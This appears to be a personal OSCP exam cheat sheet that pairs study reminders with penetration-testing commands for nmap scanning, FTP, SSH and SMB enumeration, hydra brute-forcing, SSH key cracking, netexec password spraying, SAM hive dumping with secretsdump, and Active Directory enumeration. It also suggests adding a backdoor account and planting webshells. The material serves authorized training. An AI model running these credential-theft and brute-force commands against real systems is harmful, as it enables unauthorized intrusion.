# OSCP Commands
- Some revised commands

# Stuck?
- Take 4-7-8 breathing then machine, Walk.
- Think simple!
- Go on break! Grab a snack 🙂
- Think simple!
- Something seems broken? (web\certutil\enumeration) = REVERT!!!!!
- **Think simple!**
##### Check List
- [ ] Nmap
- [ ] FTP Anonymous
- [ ] SSH
- [ ] RPC 
- [ ] SMB
- [ ] HTTP, Directory buster
- [ ] Random ports

##### Initial access?

- Did you really look on the nmap output? check the service name\version\ports\HTTP titles for exploits.
- Did you try deafult credentials?
- Did you enumerate all web directories?
- Did you look on the weird ports with `nc -nv ip port`???
- Web enumeration! did you **RECURSIVLY** enumerate every directory??
- Can’t get reverse shell? try to use the same ports that are open on the machine (not only the basic 443 🙂)
- Did you check **SNMP**?

##### Privilege escalation?

- Read linpeas/winpeas again - SLOWLY! (Do you see any passwords?)
- Enumerate manually
- Look for interesting files in /opt /Program Files
- Note every special file you see in the home directories.
- **GET STABLE SHELL!**
- Did you try to switch users / spray creds? (linux - get TTY to use ‘su’!!!)
- Try to run all exploits from suggested linpeas + all known exploits in linux section.
- Did you try to target other users/services? check if APACHE running and can write in it’s dir (can put there webshell)

[https://github.com/C0nd4/OSCP-Priv-Esc](https://github.com/C0nd4/OSCP-Priv-Esc)

##### Active Directory?

- Did you really enumerate after you got Administrator on that machine?
- Did you spray all users with all password and all protocols? Did you try —local-auth (All Regular users\Administrator also)? + (—continue-on-success)
- Are you sure you need that priv-esc? maybe we can just pivot.
- If you have Admin == You have RDP (Just open it lol + backdoor account)

##### Global

- Git
- Configuration files
- Powershell history \ transcripts
- Python script → did you try python2?
- Exploit not working? did you search another exploit version? did you search it on github? did you search the CVE?
- Found exploit but not much usage?? → DID YOU TRY READING THE COMMENTS IN THE EXPLOIT?????
- run STRINGS on binaries
  
##### Resources
- [Linux Exploits GTFOBins](https://gtfobins.github.io/)
- [Windows Exploits LOLBAS](https://lolbas-project.github.io/#)
- [Windows Active Directory Exploits WADComs](https://wadcoms.github.io/)

## Enumeration
##### Nmap
- Scan open ports
```bash
mkdir Nmap
nmap -sC -sV --open -p- -T4 -A -oN Nmap/<Name>xxx -Pn 192.168.xxx.xxx

#UDP
sudo nmap -sU -sC -sV --open -p- -T4 -A -oN Nmap/<Name>xxx -Pn 192.168.xxx.xxx

#NSE
updatedb
locate .nse | grep <name>
sudo nmap -sV -p 443 --script "vuln" <IP> #running vuln category scripts
sudo nmap --script="name" <IP> #here we can specify other options like specific ports...etc

autorecon <IP ADDRESS>6 # It will generate results folder
tree results # Check for results/IP/scans folder

sudo sh -c 'echo "<IP> <HOSTNAME>" >> /etc/hosts' # Add into /etc/hosts

Test-NetConnection -Port <port> <IP>   #powershell utility

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null #automating port scan of first 1024 ports in powershell
```
##### FTP Enumeration
- FTP bulk download [link](https://apple.stackexchange.com/questions/18106/how-do-i-download-folders-through-ftp-in-terminal)
```bash
ftp <IP> # loginwith anonymous: password

put <file> #uploading file
get <file> #downloading file

# Download bulk all, with anonymous login
wget -m ftp://anonymous:anonymous@<IP> # If it fails do to passive mode below command
wget -m --no-passive ftp://anonymous:anonymous@<IP>10.10.10.98
wget -r ftp://Anonymous:pass@$IP
wget -r -l 10 --ftp-user='anonymous' --ftp-password='anonymous' ftp://<IP>:20001/* # Hepet PG Practice

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice-versa
hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ftp

#check for vulnerabilities associated with the version identified.
```

##### SSH Enumeration
- SSH enumeration
```bash
#Login
ssh uname@IP # enter password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for a password, crack them using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice-versa
hydra -L users.txt -P pass.txt <IP> ssh -s 2222
hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ssh

#check for vulnerabilities associated with the version identified.
```
##### SMB Enumeration 
- SMB
```bash
sudo nbtscan -r <IP>/24 #IP or range can be provided

#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP 

net view \\<computername/IP> /all #In Windows, we can view like this


# nxc In place of a username and password, we can use usernames.txt and passwords.txt for password spraying or brute forcing.
nxc smb <IP/range>  
nxc smb <IP> -u username -p password --shares #lists available shares
nxc smb <IP> -u username -p password -d mydomain --shares #specific domain
nxc smb <IP> -u username -p password -d mydomain -M spider_plus # give the list of share with folder and files, Saved inside the .nxc home folder
nxc smb <IP> -u username -p password -d mydomain -M spider_plus -o EXCLUDE_FOLDER='print$,NETLOGON,SYSVOL,IPC$' # Excluding default shares
nxc smb <IP> -u username -p password --users #lists users
nxc smb <IP> -u 'anonymous' -p '' --rid-brute # Bruteforce to get the usernames
nxc smb <IP> -u username -p password --all #all information
nxc smb <IP> -u username -p password -p 445 --shares #specific port
nxc smb --pass-pol <IP>

# Smbclient with username and password
smbclient -L //IP #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username
smbclient //<IP>/<Share Name> -U <username>%<password>

#Domain
smbclient //<IP>/SQL -U zeus/guest  # Without password got the sqlconnection.sql their is a creds

#SMBCLIENT Shell, Download multiple file using, It will download only file not folders
recurse ON
prompt OFF
mget *     # It will not prompt

#SMBMAP  it will show you the permissions
smbmap -H <IP>
smbmap -H <IP> -u anonymous -d localhost
smbmap -H <IP> -u anonymous -d <DOMAIN>
smbmap -u <USERNAME> -p <LM_HASH>:<NTLM_HASH> -H <IP>
smbmap -H <IP> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#SMBMAP List contents
smbmap -r --depth 10  -s Replication -H <IP> 
smbmap -R <SHARE NAME> -H <IP> -A Groups.xml -q # locate Groups.xml, Mention the file you want to download, -R option not working
smbmap -H <IP> -u <USER> -p <PASS> -r --exclude SYSVOL, IPC$ 
sudo updatedb # Update the locate command


# recursively check the smb shares using the nxc
nxc smb <IP> -u <USER> -p <PASS> -M spider_plus # View jq . /tmp/cme_spider_plus/<IP>.json

#Within SMB session
put <file> #to upload file
get <file> #to download file

# SMB Shell with impacket-smbclient, Resourced PG Pracice  https://www.youtube.com/watch?v=xMTCZt5DRB0
impacket-smbclient <USER>:'<PASS>'@<IP>

# Exploit finder faced old machine line (445/tcp, open, microsoft-ds syn-ack ttl 125 Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP))
nmap --script smb-vuln* -p 139,445 -oN smb-vuln-scan <IP>  # Internal pg practice
#https://www.trenchesofit.com/2020/11/24/offensive-security-proving-grounds-internal-write-up-no-metasploit/ #old exploit eternal blue
#https://pentesting.zeyu2001.com/proving-grounds/warm-up/internal
```

## Linux

## Windows

##### SeBackupPrivilege, SeRestorePrivilege Windows Active Directory
- Once you have the user shell ```whoami /all``` or ```whoami /priv```
- If the user has these SeBackupPrivilege and SeRestorePrivilege permissions.
- Get the Administrator hash to log in with evil-winRM
```bash
reg save hklm\sam c:\programdata\sam
reg save hklm\system c:\programdata\system
impacket-secretsdump -system SYSTEM -sam SAM local # mention local in the command
```

## Active Directory

##### Users Active Directory
- If you don't know users in the active directory
- It allows the guest/anonymous shares
```bash
impacket-lookupsid 'domain/guest'@domain -no-pass
nxc smb IP -u 'anonymous' -p '' --rid-brute
```
#### Ldap Active Directory
- If you know the user credentials, to get the user's description
```bash
ldapdomaindump -u 'domain\username' -p 'password' IP
nxc ldap IP -u 'username' -p 'password' -M get-desc-users # It works for the anonymous login allowed
```
- If you have the valid LDAP credentials, you can run Bloodhound to collect data from the NetExec `nxc`
```bash
nxc ldap <IP> -u <USER> -p <PASS> --bloodhound --collection All --dns-server <IP> # Change the dns server to domain to ip address of the error occur
mv /home/ashok/.nxc/logs/<FILE>.zip . # Move the zip file to the preferred location
bloodhound
```
##### Login Active Directory
- Check the login with Active Directory with usernames/passwords
```bash
nxc winrm IP -u users.txt -p pass.txt --continue-on-success
```

